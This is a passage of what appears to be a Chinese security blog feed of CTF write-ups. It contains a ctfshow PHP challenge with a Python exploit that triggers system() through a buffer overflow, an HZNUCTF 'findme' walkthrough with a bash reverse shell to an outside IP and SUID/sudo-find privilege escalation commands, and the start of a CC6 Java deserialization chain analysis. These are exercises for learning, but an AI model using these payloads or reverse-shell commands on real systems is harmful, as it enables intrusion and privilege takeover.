class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-27 10:30:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-28 09:28:35</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">ctfshow</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_1</span> = <span class="number">0x41</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_2</span> = <span class="number">0x7b</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_3</span> = <span class="number">0x5b</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_4</span> = <span class="number">0x60</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_5</span> = <span class="number">0x30</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_6</span> = <span class="number">0x5f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_SIZE__</span>= <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_VAL_SIZE__</span>= <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cursor</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cache</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$ref_table</span>=[];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">define</span>(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="built_in">self</span>::<span class="variable constant_">__REF_VAL_SIZE__</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">define</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$flag</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">neaten</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fill</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fill</span>(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="string">&#x27;ctfshow&#x27;</span>)===<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="string">&#x27;flag&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">fill</span>(<span class="params"><span class="variable">$ref</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]+<span class="number">23</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$val</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache, <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>,<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>)));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$arr</span>); <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_VAL_SIZE__</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache, <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>,<span class="string">&quot;\x00&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cursor= <span class="title function_ invoke__">ftell</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">neaten</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ref_table[<span class="string">&#x27;_clear_&#x27;</span>]=<span class="variable language_">$this</span>-&gt;cursor;</span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&quot;_clear_&quot;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>),<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$arr</span>); <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">str_split</span>(<span class="keyword">__NAMESPACE__</span>.<span class="string">&quot;\C::clear&quot;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>),<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">0x36d</span>,<span class="string">&#x27;Q&#x27;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">0x30</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNeaten</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$this</span>-&gt;ref_table[<span class="string">&#x27;_clear_&#x27;</span>]+<span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>);</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>-<span class="number">4</span>));</span><br><span class="line">        <span class="variable">$t</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>-<span class="number">12</span>));</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>));</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params"><span class="variable">$ref</span>,<span class="variable">$size</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkRef</span>(<span class="variable">$ref</span>);</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$ref</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]=<span class="variable language_">$this</span>-&gt;cursor;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$r</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>),<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$r</span>); <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache,<span class="title function_ invoke__">pack</span>(<span class="string">&quot;v&quot;</span>,<span class="variable">$size</span>));</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache,<span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>,<span class="number">0x31</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cursor= <span class="title function_ invoke__">ftell</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$size</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$ref</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$ref</span>,<span class="variable">$this</span>-&gt;ref_table))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Ref not exists!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">seekCursor</span>(<span class="variable">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$cref</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="number">20</span>);</span><br><span class="line">        <span class="variable">$csize</span> = <span class="title function_ invoke__">unpack</span>(<span class="string">&quot;v&quot;</span>, <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="number">2</span>));</span><br><span class="line">        <span class="variable">$usize</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$val</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$csize</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="variable">$val</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$val</span>,<span class="variable">$fmt</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache,<span class="title function_ invoke__">pack</span>(<span class="variable">$fmt</span>,<span class="variable">$val</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cursor= <span class="title function_ invoke__">ftell</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$this</span>-&gt;cursor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">truncation</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="title function_ invoke__">array_filter</span>(<span class="title function_ invoke__">str_split</span>(<span class="variable">$data</span>),function(<span class="variable">$var</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$var</span>!==<span class="string">&quot;\x00&quot;</span>;</span><br><span class="line">        &#125;));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">seekCursor</span>(<span class="params"><span class="variable">$cursor</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$cursor</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">checkRef</span>(<span class="params"><span class="variable">$ref</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$ref</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">sizeof</span>(<span class="variable">$r</span>)&gt;<span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Refenerce size too long!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$r</span>[<span class="number">0</span>]) || <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkByte</span>(<span class="variable">$r</span>[<span class="number">0</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Ref invalid!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">array_shift</span>(<span class="variable">$r</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$r</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkByte</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Ref invalid!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">checkByte</span>(<span class="params"><span class="variable">$check</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &lt;=<span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_5</span> || <span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &gt;=<span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_2</span> )&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &gt;=<span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_3</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &lt;= <span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_4</span></span><br><span class="line">            &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) !== <span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_6</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cache=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;php://memory&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readNeaten</span>();</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> C;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">main</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一波代码审计，没时间看，以后补充</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2023-03-27 22:45:25</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2023-03-28 11:04:15</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;题目地址&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">        <span class="string">&quot;data&quot;</span>:<span class="string">&quot;A&quot;</span>*<span class="number">50</span>+<span class="string">&quot;flag&quot;</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">19</span>+<span class="string">&quot;B&quot;</span>*<span class="number">32</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">20</span>+<span class="string">&quot;system&quot;</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">18</span>+<span class="string">&quot;calc&quot;</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">16</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response = requests.post(url=url,data=data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;easy-signin&quot;&gt;&lt;a href=&quot;#easy-signin&quot; class=&quot;headerlink&quot; title=&quot;easy_signin&quot;&gt;&lt;/a&gt;easy_signin&lt;/h2&gt;&lt;p&gt;任意文件下载&lt;/p&gt;
&lt;p&gt;直接下载index.php  base6</summary>
      
    
    
    
    <category term="CTFWP" scheme="http://example.com/categories/CTFWP/"/>
    
    
  </entry>
  
  <entry>
    <title>mysql总结</title>
    <link href="http://example.com/2023/04/02/mysql%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2023/04/02/mysql%E6%80%BB%E7%BB%93/</id>
    <published>2023-04-02T10:34:14.000Z</published>
    <updated>2023-04-02T10:34:14.506Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>HZNUCTF-web-2023</title>
    <link href="http://example.com/2023/04/02/HZNUCTF-web-2023/"/>
    <id>http://example.com/2023/04/02/HZNUCTF-web-2023/</id>
    <published>2023-04-02T03:09:55.000Z</published>
    <updated>2023-04-02T04:13:46.824Z</updated>
    
    <content type="html"><![CDATA[<p><strong>这次杭州师范的决赛题目质量还是很高的</strong></p><h1 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h1><p>打开网页</p><img src="/2023/04/02/HZNUCTF-web-2023/image-20230402111040161.png" class="" title="image-20230402111040161"><p>获得信息 post传参开启burp</p><p>执行pwd有回显 但是其他命令都没有环境变量</p><img src="/2023/04/02/HZNUCTF-web-2023/image-20230402111143408.png" class="" title="image-20230402111143408"><p>于是绝对路径执行命令</p><img src="/2023/04/02/HZNUCTF-web-2023/image-20230402111241491.png" class="" title="image-20230402111241491"><p>但是cat flag时显示没有权限</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/39.105.192.9/9999 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p>url编码后本地监听 nc -lvp 9999</p><img src="/2023/04/02/HZNUCTF-web-2023/image-20230402111114298.png" class="" title="image-20230402111114298"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null </span><br></pre></td></tr></table></figure><img src="/2023/04/02/HZNUCTF-web-2023/image-20230402111453574.png" class="" title="image-20230402111453574"><h2 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /home -<span class="built_in">exec</span> /bin/bash \;</span><br></pre></td></tr></table></figure><p>太菜了还是就写一题<img src="/2023/04/02/HZNUCTF-web-2023/image-20230402121324673.png" class="" title="image-20230402121324673"></p><p>后俩题以后补充</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;这次杭州师范的决赛题目质量还是很高的&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;findme&quot;&gt;&lt;a href=&quot;#findme&quot; class=&quot;headerlink&quot; title=&quot;findme&quot;&gt;&lt;/a&gt;findme&lt;/h1&gt;&lt;p&gt;打开网页&lt;/p&gt;
&lt;i</summary>
      
    
    
    
    <category term="CTFWP" scheme="http://example.com/categories/CTFWP/"/>
    
    
  </entry>
  
  <entry>
    <title>CC6</title>
    <link href="http://example.com/2023/03/29/CC6/"/>
    <id>http://example.com/2023/03/29/CC6/</id>
    <published>2023-03-29T07:57:40.000Z</published>
    <updated>2023-04-08T06:58:44.103Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p> CC1 链的时候要求是比较严格的。要求的环境为<code>jdk8u65</code>与<code>Commons-Collections 3.2.1</code></p><p>而我们的 CC6 链，可以不受 jdk 版本制约。</p><h1 id="分析TiedMapEntry"><a href="#分析TiedMapEntry" class="headerlink" title="分析TiedMapEntry"></a>分析TiedMapEntry</h1><p>先看下TiedMapEntry中如何调用的get()</p><p>本类中有个toString()方法调用了getValue()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public String toString() &#123;</span><br><span class="line">    return getKey() + &quot;=&quot; + getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而getValue()中调用了get()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Object getValue() &#123;</span><br><span class="line">    return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再通过构造器将map赋为LazyMap即可回到CC1的后半部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public TiedMapEntry(Map map, Object key) &#123;</span><br><span class="line">    super();</span><br><span class="line">    this.map = map;</span><br><span class="line">    this.key = key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还有一个很关键的方法,直接调用getValue() </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public int hashCode() &#123;</span><br><span class="line">       Object 